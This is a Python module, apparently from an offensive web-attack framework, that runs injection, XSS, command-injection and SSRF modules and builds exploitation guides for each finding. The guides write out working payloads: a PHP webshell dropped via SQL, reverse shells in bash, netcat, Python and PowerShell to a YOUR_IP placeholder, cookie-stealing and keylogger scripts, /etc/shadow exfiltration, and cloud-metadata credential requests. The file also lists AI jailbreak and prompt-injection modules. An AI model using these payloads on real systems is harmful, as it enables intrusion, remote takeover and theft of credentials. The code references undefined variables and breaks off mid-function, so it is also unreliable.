"""Module executor for running attack modules"""

import asyncio
from typing import Dict, Any, Optional
from datetime import datetime

from app.core.request_handler import RequestHandler
from app.models.target import TargetConfig
from app.modules.sql_injection import SQLInjectionTester, InjectionPoint, SQLInjectionType
from app.modules.reconnaissance import ReconnaissanceModule
from app.modules.xss import XSSTester
from app.core.payload_engine import PayloadEngine
from app.modules.ml_exploitation import MLExploitationModule
from app.modules.cms_scanners import CMSScanner


class ModuleExecutor:
    """Execute attack modules with proper configuration"""
    
    def __init__(self):
        """Initialize module executor"""
        self.request_handler = RequestHandler()
        self.payload_engine = PayloadEngine()
    

    async def execute_module(
        self,
        module_id: str,
        target_config: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Execute a specific module against a target.
        
        Args:
            module_id: Module identifier
            target_config: Target configuration
            parameters: Module-specific parameters
            
        Returns:
            Dictionary with execution results
        """
        try:
            # Comprehensive module routing
            module_map = {
                # Injection (15)
                "sqli-error": lambda t, p: self._execute_sql_injection(t, {**p, "technique": "error-based"}),
                "sqli-time": lambda t, p: self._execute_sql_injection(t, {**p, "technique": "time-based"}),
                "sqli-boolean": lambda t, p: self._execute_sql_injection(t, {**p, "technique": "boolean-based"}),
                "sqli-union": lambda t, p: self._execute_sql_injection(t, {**p, "technique": "union-based"}),
                "sql-injection": self._execute_sql_injection,
                
                "xss-reflected": lambda t, p: self._execute_xss(t, {**p, "type": "reflected"}),
                "xss-stored": lambda t, p: self._execute_xss(t, {**p, "type": "stored"}),
                "xss-dom": lambda t, p: self._execute_xss(t, {**p, "type": "dom"}),
                "xss": self._execute_xss,

                "cmd-injection-basic": lambda t, p: self._execute_command_injection(t, {**p, "type": "basic"}),
                "cmd-injection-blind": lambda t, p: self._execute_command_injection(t, {**p, "type": "blind"}),
                "command-injection": self._execute_command_injection,

                "nosql-injection": self._execute_nosql_injection,
                "ssti": self._execute_ssti,
                "xxe": self._execute_xxe,
                
                "ssrf-basic": lambda t, p: self._execute_ssrf(t, {**p, "type": "basic"}),
                "ssrf-cloud": lambda t, p: self._execute_ssrf(t, {**p, "type": "cloud"}),
                "ssrf": self._execute_ssrf,

                # Authentication (8)
                "brute-force-login": self._execute_brute_force,
                "username-enum": lambda t, p: self._execute_brute_force(t, {**p, "mode": "enum"}),
                "brute-force": self._execute_brute_force,

                "jwt-none": lambda t, p: self._execute_jwt(t, {**p, "check": "none-alg"}),
                "jwt-weak-key": lambda t, p: self._execute_jwt(t, {**p, "check": "weak-key"}),
                "jwt": self._execute_jwt,
                "jwt-manipulation": self._execute_jwt,

                "oauth-redirect": lambda t, p: self._execute_oauth(t, {**p, "check": "redirect"}),
                "saml-signature": lambda t, p: self._execute_oauth(t, {**p, "check": "signature"}),
                "oauth": self._execute_oauth,
                "oauth-saml": self._execute_oauth,
                
                "auth-bypass": lambda t, p: self._execute_api_testing(t, {**p, "check": "auth-bypass"}),
                "csrf": self._execute_csrf,

                # API & Logic (10)
                "api-discovery": lambda t, p: self._execute_api_testing(t, {**p, "mode": "discovery"}),
                "graphql-introspection": lambda t, p: self._execute_api_testing(t, {**p, "mode": "graphql-intro"}),
                "graphql-depth": lambda t, p: self._execute_api_testing(t, {**p, "mode": "graphql-depth"}),
                "api-idor": lambda t, p: self._execute_api_testing(t, {**p, "check": "idor"}),
                "api-mass-assignment": lambda t, p: self._execute_api_testing(t, {**p, "check": "mass-assignment"}),
                "api-testing": self._execute_api_testing,

                "race-condition": self._execute_race_condition,
                "cache-poisoning": self._execute_cache_poisoning,
                "websocket-hijack": self._execute_websocket,
                "websocket": self._execute_websocket,
                "websocket-sse": self._execute_websocket,
                "cors-misconfig": self._execute_cors,
                "cors": self._execute_cors,
                "cors-exploitation": self._execute_cors,

                # File & System (7)
                "path-traversal": self._execute_directory_traversal,
                "directory-traversal": self._execute_directory_traversal,
                "lfi": lambda t, p: self._execute_directory_traversal(t, {**p, "mode": "lfi"}),
                "rfi": lambda t, p: self._execute_directory_traversal(t, {**p, "mode": "rfi"}),
                
                "file-upload-ext": lambda t, p: self._execute_file_upload(t, {**p, "check": "extension"}),
                "file-upload-mime": lambda t, p: self._execute_file_upload(t, {**p, "check": "mime"}),
                "file-upload": self._execute_file_upload,
                "file-upload-bypass": self._execute_file_upload,

                "deserialization": self._execute_deserialization,
                "prototype-pollution": self._execute_prototype_pollution,

                # Discovery & Recon (6)
                "port-scan": lambda t, p: self._execute_reconnaissance(t, {**p, "mode": "port-scan"}),
                "subdomain-enum": lambda t, p: self._execute_reconnaissance(t, {**p, "mode": "subdomain"}),
                "tech-fingerprint": lambda t, p: self._execute_reconnaissance(t, {**p, "mode": "tech"}),
                "directory-fuzz": lambda t, p: self._execute_reconnaissance(t, {**p, "mode": "dir-fuzz"}),
                "js-analysis": lambda t, p: self._execute_reconnaissance(t, {**p, "mode": "js"}),
                "reconnaissance": self._execute_reconnaissance,
                "cms-scanner": self._execute_cms_scanner,
                "quick-scan": self._execute_quick_scan,

                # Advanced & AI (6)
                "headless-browser": self._execute_headless_browser,
                "ml-prompt-injection": lambda t, p: self._execute_ml_exploitation(t, {**p, "check": "prompt-injection"}),
                "ml-jailbreak": lambda t, p: self._execute_ml_exploitation(t, {**p, "check": "jailbreak"}),
                "ml-model-inversion": lambda t, p: self._execute_ml_exploitation(t, {**p, "check": "model-inversion"}),
                "ml-adversarial": lambda t, p: self._execute_ml_exploitation(t, {**p, "check": "adversarial"}),
                "ml-indirect": lambda t, p: self._execute_ml_exploitation(t, {**p, "check": "indirect"}),
                "ml-exploitation": self._execute_ml_exploitation,
            }
            
            if module_id in module_map:
                return await module_map[module_id](target_config, parameters)
            else:
                return {
                    "status": "error",
                    "error": f"Module '{module_id}' not yet implemented",
                    "findings": []
                }
        
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "findings": []
            }
    
    async def _execute_sql_injection(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute SQL injection testing"""
        
        tester = SQLInjectionTester(self.request_handler, self.payload_engine)
        
        # Get parameter to test
        param_name = parameters.get("parameter", "id")
        technique = parameters.get("technique", "all")
        
        # Create injection point from target URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target.url)
        query_params = parse_qs(parsed.query)
        
        # Determine injection location
        if param_name in query_params:
            location = "query"
            original_value = query_params[param_name][0] if query_params[param_name] else "1"
        else:
            location = "query"
            original_value = "1"
        
        injection_point = InjectionPoint(
            parameter=param_name,
            location=location,
            original_value=original_value,
            url=target.url,
            method="GET",
            headers=target.custom_headers or {}
        )
        
        # Determine techniques to use
        techniques = None
        if technique != "all":
            technique_map = {
                "time-based": SQLInjectionType.TIME_BASED_BLIND,
                "boolean": SQLInjectionType.BOOLEAN_BASED,
                "error-based": SQLInjectionType.ERROR_BASED
            }
            if technique in technique_map:
                techniques = [technique_map[technique]]
        
        # Execute tests
        results = await tester.test_injection_point(injection_point, techniques)
        
        # Format results with detailed CTF-ready information
        findings = []
        for result in results:
            if result.is_vulnerable:
                # Build detailed description with proper formatting
                description_parts = []
                
                # Summary section
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.injection_point.parameter}")
                description_parts.append(f"Injection Type: {inj_type.replace('_', ' ').title()}")
                description_parts.append(f"Database: {db_type.upper()}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                # Add database-specific exploitation queries
                if db_type == "mysql":
                    description_parts.append("=== MYSQL EXPLOITATION GUIDE ===")
                    description_parts.append("")
                    description_parts.append("1. GET DATABASE VERSION:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,@@version-- -")
                    description_parts.append("")
                    description_parts.append("2. GET CURRENT DATABASE:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,database()-- -")
                    description_parts.append("")
                    description_parts.append("3. LIST ALL DATABASES:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -")
                    description_parts.append("")
                    description_parts.append("4. LIST TABLES:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -")
                    description_parts.append("")
                    description_parts.append("5. LIST COLUMNS IN TABLE:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -")
                    description_parts.append("")
                    description_parts.append("6. EXTRACT DATA:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,CONCAT(username,':',password) FROM users-- -")
                    description_parts.append("")
                    description_parts.append("7. READ FILES (requires FILE privilege):")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -")
                    description_parts.append("")
                    description_parts.append("8. WRITE WEBSHELL (requires FILE privilege):")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -")
                
                elif db_type == "postgresql":
                    description_parts.append("=== POSTGRESQL EXPLOITATION GUIDE ===")
                    description_parts.append("")
                    description_parts.append("1. GET DATABASE VERSION:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,version()-- -")
                    description_parts.append("")
                    description_parts.append("2. GET CURRENT DATABASE:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,current_database()-- -")
                    description_parts.append("")
                    description_parts.append("3. LIST ALL DATABASES:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,datname FROM pg_database-- -")
                    description_parts.append("")
                    description_parts.append("4. LIST TABLES:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'-- -")
                    description_parts.append("")
                    description_parts.append("5. REMOTE CODE EXECUTION (requires superuser):")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'-- -")
                
                elif db_type == "mssql":
                    description_parts.append("=== MSSQL EXPLOITATION GUIDE ===")
                    description_parts.append("")
                    description_parts.append("1. GET DATABASE VERSION:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' UNION SELECT NULL,@@version-- -")
                    description_parts.append("")
                    description_parts.append("2. ENABLE XP_CMDSHELL:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -")
                    description_parts.append("")
                    description_parts.append("3. EXECUTE COMMANDS:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1'; EXEC xp_cmdshell 'whoami'-- -")
                
                # Add technique-specific exploitation
                description_parts.append("")
                if inj_type == "time_based_blind":
                    description_parts.append("=== TIME-BASED BLIND EXPLOITATION ===")
                    description_parts.append("")
                    description_parts.append("Extract database name (character by character):")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -")
                    description_parts.append("")
                    description_parts.append("Automated extraction with sqlmap:")
                    description_parts.append(f"   sqlmap -u \"{result.injection_point.url}\" -p {result.injection_point.parameter} --technique=T --dbs")
                
                elif inj_type == "boolean_based":
                    description_parts.append("=== BOOLEAN-BASED BLIND EXPLOITATION ===")
                    description_parts.append("")
                    description_parts.append("Test true condition:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' AND '1'='1")
                    description_parts.append("")
                    description_parts.append("Test false condition:")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' AND '1'='2")
                    description_parts.append("")
                    description_parts.append("Extract data (character by character):")
                    description_parts.append(f"   ?{result.injection_point.parameter}=1' AND SUBSTRING(database(),1,1)='a'-- -")
                
                # Add sqlmap command
                description_parts.append("")
                description_parts.append("=== AUTOMATED EXPLOITATION ===")
                description_parts.append("")
                description_parts.append("sqlmap command:")
                description_parts.append(f"   sqlmap -u \"{result.injection_point.url}\" -p {result.injection_point.parameter} --batch --dump")
                
                # Add evidence
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                # Create detailed proof of concept
                poc_lines = []
                poc_lines.append(f"# Vulnerable URL:")
                poc_lines.append(f"{result.injection_point.url}")
                poc_lines.append(f"\n# Vulnerable Parameter: {result.injection_point.parameter}")
                poc_lines.append(f"\n# Injection Payload:")
                poc_lines.append(f"{result.payload}")
                poc_lines.append(f"\n# Full Exploit URL:")
                poc_lines.append(f"{result.injection_point.url.replace(f'{result.injection_point.parameter}={result.injection_point.original_value}', f'{result.injection_point.parameter}={result.payload}')}")
                poc_lines.append(f"\n# cURL Command:")
                poc_lines.append(f"curl \"{result.injection_point.url.replace(f'{result.injection_point.parameter}={result.injection_point.original_value}', f'{result.injection_point.parameter}={result.payload}')}\"")
                
                proof_of_concept = "\n".join(poc_lines)
                
                # Build remediation
                remediation_lines = []
                remediation_lines.append("1. Use Prepared Statements (Parameterized Queries)")
                remediation_lines.append("2. Input Validation: Whitelist allowed characters")
                remediation_lines.append("3. Escape Special Characters")
                remediation_lines.append("4. Use ORM (Object-Relational Mapping)")
                remediation_lines.append("5. Principle of Least Privilege for database user")
                remediation_lines.append("6. Web Application Firewall (WAF)")
                remediation = "\n".join(remediation_lines)
                
                findings.append({
                    "vulnerability_type": "SQL Injection",
                    "severity": "high",
                    "parameter": result.injection_point.parameter,
                    "injection_type": inj_type,
                    "database_type": db_type,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence,
                    "metadata": result.metadata,
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results),
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_xss(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute XSS testing"""
        
        from app.modules.xss import XSSTester, XSSContext
        
        tester = XSSTester(self.request_handler, self.payload_engine)
        
        param_name = parameters.get("parameter", "q")
        context = parameters.get("context", "html")
        
        # Map context string to enum
        context_map = {
            "html": XSSContext.HTML,
            "attribute": XSSContext.ATTRIBUTE,
            "javascript": XSSContext.JAVASCRIPT,
            "url": XSSContext.URL
        }
        xss_context = context_map.get(context, XSSContext.HTML)
        
        # Test XSS
        results = await tester.test_xss(
            url=target.url,
            parameter=param_name,
            context=xss_context,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                xss_type = result.xss_type.value if result.xss_type else "unknown"
                context = result.context.value if result.context else "unknown"
                
                # Build detailed description
                description_parts = []
                
                # Summary section
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.parameter}")
                description_parts.append(f"XSS Type: {xss_type.replace('_', ' ').title()}")
                description_parts.append(f"Context: {context.title()}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                # Context-specific exploitation
                description_parts.append("=== XSS EXPLOITATION GUIDE ===")
                description_parts.append("")
                
                if context == "html":
                    description_parts.append("HTML CONTEXT PAYLOADS:")
                    description_parts.append(f"   1. Basic: <script>alert(document.domain)</script>")
                    description_parts.append(f"   2. IMG tag: <img src=x onerror=alert(1)>")
                    description_parts.append(f"   3. SVG: <svg onload=alert(1)>")
                    description_parts.append(f"   4. Body: <body onload=alert(1)>")
                    description_parts.append("")
                    description_parts.append("COOKIE STEALING:")
                    description_parts.append(f"   <script>fetch('http://YOUR_IP/?c='+document.cookie)</script>")
                    description_parts.append("")
                    description_parts.append("KEYLOGGER:")
                    description_parts.append(f"   <script>document.onkeypress=function(e){{fetch('http://YOUR_IP/?k='+e.key)}}</script>")
                
                elif context == "attribute":
                    description_parts.append("ATTRIBUTE CONTEXT PAYLOADS:")
                    description_parts.append(f"   1. Break out: \" onmouseover=\"alert(1)")
                    description_parts.append(f"   2. Event handler: \" autofocus onfocus=\"alert(1)")
                    description_parts.append(f"   3. Close tag: \"><script>alert(1)</script>")
                
                elif context == "javascript":
                    description_parts.append("JAVASCRIPT CONTEXT PAYLOADS:")
                    description_parts.append(f"   1. String break: ';alert(1)//")
                    description_parts.append(f"   2. Comment break: */alert(1)/*")
                    description_parts.append(f"   3. Template literal: `${{alert(1)}}`")
                
                description_parts.append("")
                description_parts.append("=== BYPASS TECHNIQUES ===")
                description_parts.append("")
                description_parts.append("WAF Bypass:")
                description_parts.append("   1. Case variation: <ScRiPt>alert(1)</sCrIpT>")
                description_parts.append("   2. Encoding: <script>alert(String.fromCharCode(88,83,83))</script>")
                description_parts.append("   3. Event handlers: <img src=x onerror=alert`1`>")
                description_parts.append("   4. Unicode: <script>\\u0061lert(1)</script>")
                description_parts.append("")
                description_parts.append("Filter Bypass:")
                description_parts.append("   1. Null bytes: <script\\x00>alert(1)</script>")
                description_parts.append("   2. HTML entities: &lt;script&gt;alert(1)&lt;/script&gt;")
                description_parts.append("   3. Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e")
                
                description_parts.append("")
                description_parts.append("=== IMPACT DEMONSTRATION ===")
                description_parts.append("")
                description_parts.append("Steal Session Cookie:")
                description_parts.append(f"   ?{result.parameter}=<script>new Image().src='http://YOUR_IP/?c='+document.cookie</script>")
                description_parts.append("")
                description_parts.append("Redirect to Phishing:")
                description_parts.append(f"   ?{result.parameter}=<script>window.location='http://evil.com/phish.html'</script>")
                description_parts.append("")
                description_parts.append("Deface Page:")
                description_parts.append(f"   ?{result.parameter}=<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>")
                
                # Add evidence
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                # Proof of concept
                poc_lines = []
                poc_lines.append(f"Vulnerable URL: {target.url}")
                poc_lines.append(f"Vulnerable Parameter: {result.parameter}")
                poc_lines.append(f"XSS Payload: {result.payload}")
                poc_lines.append(f"")
                poc_lines.append(f"Test URL:")
                poc_lines.append(f"{target.url}?{result.parameter}={result.payload}")
                proof_of_concept = "\n".join(poc_lines)
                
                # Remediation
                remediation_lines = []
                remediation_lines.append("1. Output Encoding: Encode all user input before displaying")
                remediation_lines.append("2. Input Validation: Whitelist allowed characters")
                remediation_lines.append("3. Content Security Policy (CSP): Restrict script sources")
                remediation_lines.append("4. HTTPOnly Cookies: Prevent JavaScript access to cookies")
                remediation_lines.append("5. X-XSS-Protection Header: Enable browser XSS filter")
                remediation_lines.append("6. Use Security Libraries: DOMPurify, OWASP Java Encoder")
                remediation = "\n".join(remediation_lines)
                
                findings.append({
                    "vulnerability_type": "Cross-Site Scripting (XSS)",
                    "severity": "high",
                    "parameter": result.parameter,
                    "xss_type": xss_type,
                    "context": context,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence,
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results),
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_reconnaissance(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute reconnaissance"""
        
        recon = ReconnaissanceModule(self.request_handler)
        
        deep_scan = parameters.get("deep_scan", False)
        
        # Fingerprint technologies
        fingerprint_result = await recon.fingerprint_wappalyzer(target)
        
        # Get attack suggestions
        suggestions = recon.suggest_attack_modules(fingerprint_result.technologies)
        
        findings = []
        
        # Add technology findings
        for tech in fingerprint_result.technologies:
            findings.append({
                "vulnerability_type": "Technology Detection",
                "severity": "info",
                "technology": tech.name,
                "version": tech.version,
                "category": tech.category,
                "suggested_attacks": suggestions.get(tech.name, [])
            })
        
        # Add server info
        if fingerprint_result.server:
            findings.append({
                "vulnerability_type": "Server Information Disclosure",
                "severity": "low",
                "server": fingerprint_result.server,
                "powered_by": fingerprint_result.powered_by
            })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "technologies_detected": len(fingerprint_result.technologies),
                "server": fingerprint_result.server,
                "attack_suggestions": suggestions
            }
        }
    
    async def _execute_quick_scan(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute quick vulnerability scan"""
        
        from app.modules.quick_scan import QuickScanner
        
        scanner = QuickScanner(self.request_handler)
        results = await scanner.quick_scan(target)
        
        findings = []
        for vuln in results.vulnerabilities:
            findings.append({
                "vulnerability_type": vuln.vulnerability_type,
                "severity": vuln.severity,
                "description": vuln.description,
                "evidence": vuln.evidence,
                "remediation": vuln.remediation
            })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_checks": results.total_checks,
                "vulnerabilities_found": len(findings),
                "scan_time": results.scan_time
            }
        }
    
    async def _execute_command_injection(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute command injection testing"""
        
        from app.modules.command_injection import CommandInjectionTester
        
        tester = CommandInjectionTester(self.request_handler)
        param_name = parameters.get("parameter", "cmd")
        
        results = await tester.test_command_injection(
            url=target.url,
            parameter=param_name,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                os_type = result.os_type if hasattr(result, 'os_type') else "unknown"
                
                description_parts = []
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.parameter}")
                description_parts.append(f"Injection Type: Command Injection")
                description_parts.append(f"OS Detected: {os_type.upper()}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                description_parts.append("=== COMMAND INJECTION EXPLOITATION ===")
                description_parts.append("")
                description_parts.append("1. BASIC COMMAND EXECUTION:")
                description_parts.append(f"   ?{result.parameter}=; whoami")
                description_parts.append(f"   ?{result.parameter}=| id")
                description_parts.append(f"   ?{result.parameter}=` hostname `")
                description_parts.append(f"   ?{result.parameter}=$( uname -a )")
                description_parts.append("")
                
                description_parts.append("2. REVERSE SHELL:")
                if os_type == "linux":
                    description_parts.append("   Bash reverse shell:")
                    description_parts.append(f"   ?{result.parameter}=; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
                    description_parts.append("")
                    description_parts.append("   Netcat reverse shell:")
                    description_parts.append(f"   ?{result.parameter}=; nc YOUR_IP 4444 -e /bin/bash")
                    description_parts.append("")
                    description_parts.append("   Python reverse shell:")
                    description_parts.append(f"   ?{result.parameter}=; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
                elif os_type == "windows":
                    description_parts.append("   PowerShell reverse shell:")
                    description_parts.append(f"   ?{result.parameter}=; powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"")
                
                description_parts.append("")
                description_parts.append("3. DATA EXFILTRATION:")
                description_parts.append(f"   ?{result.parameter}=; cat /etc/passwd | curl -d @- http://YOUR_IP/")
                description_parts.append(f"   ?{result.parameter}=; curl http://YOUR_IP/$(whoami)")
                description_parts.append(f"   ?{result.parameter}=; wget --post-file=/etc/shadow http://YOUR_IP/")
                description_parts.append("")
                
                description_parts.append("4. FILE OPERATIONS:")
                description_parts.append(f"   Read files: ?{result.parameter}=; cat /etc/passwd")
                description_parts.append(f"   Write files: ?{result.parameter}=; echo 'malicious' > /tmp/evil.txt")
                description_parts.append(f"   Download files: ?{result.parameter}=; wget http://YOUR_IP/shell.sh -O /tmp/shell.sh")
                
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                poc_lines = []
                poc_lines.append(f"Vulnerable URL: {target.url}")
                poc_lines.append(f"Vulnerable Parameter: {result.parameter}")
                poc_lines.append(f"Payload: {result.payload}")
                poc_lines.append(f"")
                poc_lines.append(f"cURL Command:")
                poc_lines.append(f"curl \"{target.url}?{result.parameter}={result.payload}\"")
                proof_of_concept = "\n".join(poc_lines)
                
                remediation = "1. Use parameterized commands\n2. Input validation with whitelist\n3. Avoid shell execution (use safe APIs)\n4. Principle of least privilege\n5. Disable dangerous functions\n6. Use sandboxing/containers"
                
                findings.append({
                    "vulnerability_type": "Command Injection",
                    "severity": "critical",
                    "parameter": result.parameter,
                    "os_type": os_type,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence if hasattr(result, 'evidence') else [],
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results) if results else 0,
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_ssrf(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute SSRF testing"""
        
        from app.modules.ssrf import SSRFTester
        
        tester = SSRFTester(self.request_handler)
        param_name = parameters.get("parameter", "url")
        
        results = await tester.test_ssrf(
            url=target.url,
            parameter=param_name,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description_parts = []
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.parameter}")
                description_parts.append(f"SSRF Type: {result.ssrf_type if hasattr(result, 'ssrf_type') else 'Unknown'}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                description_parts.append("=== SSRF EXPLOITATION GUIDE ===")
                description_parts.append("")
                description_parts.append("1. AWS METADATA SERVICE:")
                description_parts.append(f"   ?{result.parameter}=http://169.254.169.254/latest/meta-data/")
                description_parts.append(f"   ?{result.parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
                description_parts.append(f"   ?{result.parameter}=http://169.254.169.254/latest/user-data/")
                description_parts.append("")
                
                description_parts.append("2. GOOGLE CLOUD METADATA:")
                description_parts.append(f"   ?{result.parameter}=http://metadata.google.internal/computeMetadata/v1/")
                description_parts.append(f"   ?{result.parameter}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
                description_parts.append("")
                
                description_parts.append("3. AZURE METADATA:")
                description_parts.append(f"   ?{result.parameter}=http://169.254.169.254/metadata/instance?api-version=2021-02-01")
                description_parts.append("")
                
                description_parts.append("4. INTERNAL PORT SCANNING:")
                description_parts.append(f"   ?{result.parameter}=http://127.0.0.1:22")
                description_parts.append(f"   ?{result.parameter}=http://127.0.0.1:3306")
                description_parts.append(f"   ?{result.parameter}=http://127.0.0.1:6379")
                description_parts.append(f"   ?{result.parameter}=http://127.0.0.1:9200")
                description_parts.append("")
                
                description_parts.append("5. FILE READING:")
                description_parts.append(f"   ?{result.parameter}=file:///etc/passwd")
                description_parts.append(f"   ?{result.parameter}=file:///c:/windows/win.ini")
                description_parts.append(f"   ?{result.parameter}=file:///proc/self/environ")
                description_parts.append("")
                
                description_parts.append("6. BYPASS TECHNIQUES:")
                description_parts.append("   IP encoding: http://2130706433/ (127.0.0.1)")
                description_parts.append("   DNS rebinding: http://spoofed.burpcollaborator.net")
                description_parts.append("   URL parser bypass: http://evil.com@127.0.0.1")
                description_parts.append("   Redirect bypass: http://YOUR_SERVER/redirect.php?url=http://169.254.169.254/")
                
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                proof_of_concept = f"Vulnerable URL: {target.url}\nVulnerable Parameter: {result.parameter}\nPayload: {result.payload}\n\ncURL Command:\ncurl \"{target.url}?{result.parameter}={result.payload}\""
                
                remediation = "1. Whitelist allowed URLs/IPs\n2. Disable URL redirects\n3. Use network segmentation\n4. Validate and sanitize input\n5. Use DNS resolution checks\n6. Implement timeout limits"
                
                findings.append({
                    "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                    "severity": "high",
                    "parameter": result.parameter,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence if hasattr(result, 'evidence') else [],
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
